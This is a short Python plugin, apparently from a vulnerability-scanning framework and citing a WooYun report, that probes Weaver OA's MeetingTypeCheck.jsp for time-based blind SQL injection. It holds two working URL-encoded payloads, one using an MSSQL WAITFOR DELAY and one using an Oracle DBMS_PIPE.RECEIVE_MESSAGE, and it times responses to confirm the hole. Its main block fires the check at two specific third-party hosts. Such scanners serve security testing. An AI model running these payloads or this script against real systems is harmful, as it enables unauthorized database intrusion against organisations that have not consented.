#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0139376

import time

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):            
    payloads = [
        'meeting/Maint/MeetingTypeCheck.jsp?typename=aaa111&id=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27',
        'meeting/Maint/MeetingTypeCheck.jsp?typename=aaa111%27%20AND%206387%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28102%29%7C%7CCHR%2877%29%7C%7CCHR%2882%29%7C%7CCHR%28102%29%2C5%29%20AND%20%271%27%3D%271'
        ]
    for payload1 in payloads:
        payload2 = payload1.replace('5','0')
        t1 = time.time()
        code1, head, res1, errcode, _ = curl.curl2(arg + payload1)
        t2 = time.time()
        code2, head, res2, errcode, _ = curl.curl2(arg + payload2)
        t3 = time.time()
        if code1==200 and code2 == 200 and (2*t2 - t1 - t3 > 3):
            security_hole(arg + "meeting/Maint/MeetingTypeCheck.jsp?typename=aaa111&id=1" + "   :time-based blind")
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa','http://oa.scjnh.com:9000/')[1])
    audit(assign('weaver_oa','http://oaf.yitoa.com:6688/')[1])